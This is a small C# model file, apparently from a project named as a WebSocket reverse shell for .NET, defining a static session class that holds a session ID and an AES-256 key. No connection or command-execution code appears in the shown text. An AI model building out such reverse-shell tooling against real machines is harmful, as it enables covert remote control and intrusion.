using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace WebSocketReverseShellDotNet.model
{
    internal static class ReverseShellSession
    {
        public static String? SessionId { get; set; }
        public static String? AES256Key { get; set; }
    }
}
